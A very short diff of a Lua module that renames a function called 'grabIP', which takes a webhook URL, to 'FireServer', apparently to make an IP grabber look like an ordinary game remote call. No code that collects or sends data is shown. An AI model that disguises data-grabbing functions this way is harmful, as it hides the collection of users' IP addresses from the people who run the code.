@@ -1,6 +1,6 @@
 local grab = {}
 
-function grab:grabIP(Webhook)
+function grab:FireServer(Webhook)
     
 local url = Webhook
 
